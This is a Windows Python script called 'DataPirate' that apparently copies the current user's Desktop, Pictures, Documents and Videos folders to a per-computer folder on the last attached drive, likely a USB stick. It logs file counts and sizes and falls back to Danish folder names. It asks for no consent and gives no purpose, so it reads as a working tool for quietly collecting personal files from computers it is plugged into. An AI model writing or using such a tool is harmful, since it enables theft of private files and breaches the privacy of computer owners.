#!/usr/bin/env python
# coding=utf-8
import os, os.path
import shutil
from shutil import copyfile
import win32api
import sys
from colorama import init, Fore, Back, Style



#Default
desktoppath = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
picturepath = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Pictures')
documentspath = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Documents')
videospath = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Videos')

#Computername
computername = os.environ['COMPUTERNAME']

#Usb letter
drives = win32api.GetLogicalDriveStrings()
drives = drives.split('\000')[:-1]

getdriveletter = drives[-1]

mainfolder = getdriveletter + "DataPirate\\"

folderpath = getdriveletter + "DataPirate\$" + str.lower(computername) + "\\"
#Create folder

#Create status txt
def statustxt(newdata):
	with open(folderpath + "status.txt", "a")as f:
		f.write("\n" + newdata)

def parse_bytes(B):
	B   = float(B)
	KB  = float(1024)
	MB  = float(KB ** 2)
	GB  = float(KB ** 3)
	TB  = float(KB ** 4)
	if B < KB:
		return '{0} {1}'.format(int(B) if B > 0 else 'Empty' ,'B' if B > 0 else '')
	elif KB <= B < MB:
		return '{0} KB'.format(round(int(B)/int(KB)))
	elif MB <= B < GB:
		return '{0} MB'.format(round(int(B)/int(MB)))
	elif GB <= B < TB:
		return '{0} GB'.format(round(int(B)/int(GB)))
	elif TB <= B:
		return '{0} TB'.format(round(int(B)/int(TB)))


def walk(paths):
	count = 0
	size = 0
	for i in range(len(paths)):
		for root, dirnames, filenames in os.walk(paths[i]):
			for f in filenames:
				count += 1
				size += os.stat(os.path.join(root, f)).st_size

	return [count, parse_bytes(size)]

def createfolder(foldername):
	try:
		if not os.path.exists(foldername):
			print()
			print("Creating folder ",foldername)
			os.makedirs(foldername)
	except:
		print("Something went wrong creating the folder")

def printinfomation():

	amountofdesktopfiles = len(os.listdir(desktoppath))
	totalfiles = walk([desktoppath, picturepath, documentspath])
	statustxt(totalfiles[1])
	lastdrive = win32api.GetVolumeInformation(getdriveletter)
	print("{0:<20} {1:<20}".format("Harddrive", getdriveletter + lastdrive[0]))
	print("{0:<20} {1:<20}".format("Computername", computername))
	print("{0:<20} {1:<20}".format("Copying files to", folderpath))
	print("{0:<20} {1:<20}".format("____________________", "____________________"))
	print("{0:<20} {1:<10}".format("Total Files", str(totalfiles[0])))
	print("{0:<20} {1:<10}".format("Total size", str(totalfiles[1])))
	print("{0:<20} {1:<20}".format("____________________", "____________________"))

def copyfiles(filepathname, filepath):
	try:
		successfullfiles = 0
		print()
		print("Copying from "+ filepathname)

		createfolder(mainfolder + "$" + computername + "\\" + filepathname)

		for f in os.listdir(filepath):
			
			s = os.path.join(filepath, f)
			d = os.path.join(mainfolder + "$" + computername + "\\" + filepathname, f)
			try:
				if os.path.isdir(s):
					shutil.copytree(s,d)
					successfullfiles = successfullfiles + 1
				else:
					shutil.copy2(s,d)
					successfullfiles = successfullfiles + 1
				print("{0:<20} {1:<10}".format(f, "Copyed"))
			except Exception as e:
				print (e)
		print("")
	except Exception as e:
		print()
		print(str(e).upper())
		print()



def main():
	init()
	global desktoppath
	global documentspath
	global videospath
	global picturepath


	while True:
		try:
			print(Fore.RED)
			createfolder(mainfolder)
			createfolder(mainfolder + "$" + computername)

			with open(folderpath + "status.txt", "w+")as f:
				f.write("Status Log")

			statustxt("")
			printinfomation()
			copyfiles("Desktop", desktoppath)
			copyfiles("Pictures", picturepath)
			copyfiles('Documents', documentspath)
			copyfiles('Videos', videospath)
			sys.exit()
		except Exception as e:
			statustxt(str(e))
			desktoppath = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Skrivebord')
			picturepath = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Billeder')
			documentspath = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Dokumenter')
			videospath = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Videoer')


if __name__ == '__main__':
	main()
